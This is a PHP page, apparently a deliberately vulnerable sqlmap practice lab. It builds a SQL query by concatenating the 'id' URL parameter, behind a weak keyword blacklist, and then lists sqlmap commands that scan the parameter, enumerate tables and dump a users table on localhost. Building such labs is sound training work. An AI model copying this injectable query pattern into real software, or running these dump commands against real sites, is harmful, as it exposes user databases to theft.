<?php
require_once(dirname($_SERVER['DOCUMENT_ROOT']) . "/vendor/autoload.php");


/**
 * @var \PDO $connector
 */
$connector = new My\DB("myTestDb");

if (isset($_GET['id'])) {
    if (strripos($_GET['id'], 'SLEEP')) {
        die ("DAMN YOU HACKERS");
    }
    if (strripos($_GET['id'], 'BENCHMARK')) {
        die ("DAMN YOU HACKERS");
    }
    if (strripos($_GET['id'], 'AND')) {
        die ("DAMN YOU HACKERS");
    }
    if (strripos($_GET['id'], 'OR')) {
        die ("DAMN YOU HACKERS");
    }
    if (strripos($_GET['id'], 'UNION')) {
        die ("DAMN YOU HACKERS");
    }
    
    $query = "SELECT * FROM users WHERE id=" . $_GET['id'] . " LIMIT 0, 1";
    $connector->getConnector()->query($query);
}

?>
<style>
    i {
        font-family: 'DeJaVu Sans Mono';
    }
</style>
<hr />
SQLMap Steps
<ol>
    <li>Scan for vulnerable URL parameters <i>./sqlmap.py -u http://localhost:666/sqlmap/example6.php?id=1 --batch --flush-session</i></li>
    <li>List all tables <i>./sqlmap.py -u http://localhost:666/sqlmap/example6.php?id=1 --tables --batch --flush-session</i></li>
    <li>Get table entries from users <i>./sqlmap.py -u http://localhost:666/sqlmap/example6.php?id=1 -D myTestDb -T users --dump --batch --flush-session</i></li>
</ol>
<?php include('index.php');?>